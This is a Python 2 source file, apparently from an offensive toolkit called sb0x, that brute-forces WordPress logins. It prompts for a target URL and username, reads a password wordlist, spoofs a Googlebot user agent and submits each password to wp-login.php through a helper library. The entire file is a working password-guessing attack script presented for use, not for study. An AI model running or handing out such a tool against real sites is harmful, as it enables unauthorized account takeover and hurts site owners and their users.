"""
wordpress.py - wp-login.php Brute force
authot: levi0x0
Copyright (c) 2013-201x sb0x project

See the file LICENSE
"""

import lib.wordpress_test as wptest #import wordpress brute force lib as wptest
import sys
import urllib2
import re
import threading

version = '0.1alp'
def main():
	try:
		print "--wordpress brute force %s--" % (version)
		print "GPLv3"
		target = raw_input("\n* Target:") #get target
		#test target
		target = target.replace("wp-login.php", "")
		if not "://" in target:
			print "[-] http:// requierd.."
			sys.exit()
		else:
			pass
		target = "%s/wp-login.php" % (target)
		user = raw_input("* User:")
		passwords = open("wordlist/password.lst").readlines()

		#proxy setting
		ask_for_proxy = False #in deve until version 1.0.6-rc blackhat edition
		if ask_for_proxy == "y" or ask_for_proxy == "Y":
			proxy = True
			proxy_server = raw_input("* Proxy IP:")
			proxy_port = int(raw_input("* Proxy PORT:"))

		else:
			proxy = False
			proxy_server = None
			proxy_port = 8080

		user_agent = ["Mozilla/5.0 (Google bot http://google.com/bot.html)"]

		verbose = False

		try:
			urllib2.urlopen(target)

		except urllib2.HTTPError, e:
			print 
			if e.code == 404:
				print "[-]INFO: %s return 404 error." % (target)
				sys.exit(1)
			else:
				print "[*]INFO: 200 OK %s" % (target)
		print "[*] Start Attack... good luck!....."
		for passw in passwords:
			tags = {'log' : user, 'pwd' :  passw, 'wp-submit' : 'Log+In', 'redirect_to' : target, }
			start = wptest.brute_force(target, tags, user, passw.replace("\n", ""), proxy, proxy_server, proxy_port, user_agent,verbose)
			start.run()

	except KeyboardInterrupt:
		print "\nCtrl-C was pressed"
		sys.exit(0)
	except (urllib2.URLError):
		print "\n[-] conection faild or check your internet setting."
		sys.exit(1)
	except IOError:
		print "\n[-]No such file or directory: %s" % (passwords)
		sys.exit(1)

